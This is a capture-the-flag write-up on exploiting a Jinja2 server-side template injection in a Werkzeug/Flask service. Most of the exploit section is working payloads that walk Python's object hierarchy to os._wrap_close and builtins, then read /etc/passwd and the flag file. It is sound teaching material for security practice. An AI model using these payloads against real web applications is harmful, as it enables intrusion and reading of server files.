# Templates
## Introduction
Just a simple service made using Server Side Rendering.
## Challenge Resolution
The title and introduction let us think about a Server Side Template Injection (`SSTI`) vulnerability.
```http
HTTP/1.1 200 OK
Server: Werkzeug/2.3.7 Python/3.11.14
Date: Fri, 13 Feb 2026 16:13:42 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 771
Connection: close
```
From `Burp`, we notice the server is running [Werkzeug](https://werkzeug.palletsprojects.com/en/stable/tutorial/#step-1-creating-the-folders), a **Python webserver** using `Jinja2`.
#### Injection Syntax Tests
From [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#methodology), we get this diagram to guess the technology used in the backend:
![SSTI cheatsheet workflow](https://github.com/swisskyrepo/PayloadsAllTheThings/raw/master/Server%20Side%20Template%20Injection/Images/serverside.png?raw=true)
We try successively the different payloads until `{{7*'7'}}`, which results in `7777777`. In `Twig`, it would have resulted in `49`, so we can confirm the template language in use is `Jinja2`.
#### SSTI Exploit
We use this [cheatsheet](https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti) and this CTF [write-up](https://www.arashparsa.com/gactf/).

In `Python`, everything is an object. Thus, it is possible to navigate loaded classes and use the associated methods. 

To access the `type` object of an object, the function `__class__` is employed. To navigate in the tree of inherited objects, we use the following methods:
- `__subclasses__`: go down the tree
- `__mro__`: go back up the tree

If `subprocess.popen` or `os._wrap_close` class is loaded, we can get RCE on the target. With `os._wrap_close`, we also can read arbitrary files.

We first check for context and global variables, to get information and have a base to navigate the tree of inherited objects:
- `config`, the current configuration object
- `request`, the current request object
- `session`, the current session object
- `g`, the request-bound object for global variables. This is usually used by the developer to store resources during a request.
```python
# The config variable is found, we leverage the datetime object to access the `object` type.
{{ (config.items() | list)[4][1].__class__.__mro__ }}

(<class 'datetime.timedelta'>, <class 'object'>)

# We apply __subclasses__ to <class 'object'> to print every loaded classes
{{ (config.items() | list)[4][1].__class__.__mro__[1].__subclasses__() }}

[<class 'type'>, <class 'async_generator'>, <class 'bytearray_iterator'>, <class 'bytearray'>,..SNIP..]

# We found os._wrap_close among the loaded classes!
{{ (config.items() | list)[4][1].__class__.__mro__[1].__subclasses__()[141] }}

<class 'os._wrap_close'>

# This module provides direct access to all 'built-in' identifiers of Python
{{ (config.items() | list)[4][1].__class__.__mro__[1].__subclasses__()[141].__init__.__globals__.__builtins__ }}

# Using `open` we can read arbitrary files
{{ (config.items() | list)[4][1].__class__.__mro__[1].__subclasses__()[141].__init__.__globals__.__builtins__ .open('/etc/passwd').read() }}

# We can thus read flag.txt
{{ (config.items() | list)[4][1].__class__.__mro__[1].__subclasses__()[141].__init__.__globals__.__builtins__ .open('flag.txt)').read() }}
```
Finally, we access the flag:
```flag
0xfun{Server_Side_Template_Injection_Awesome}
```
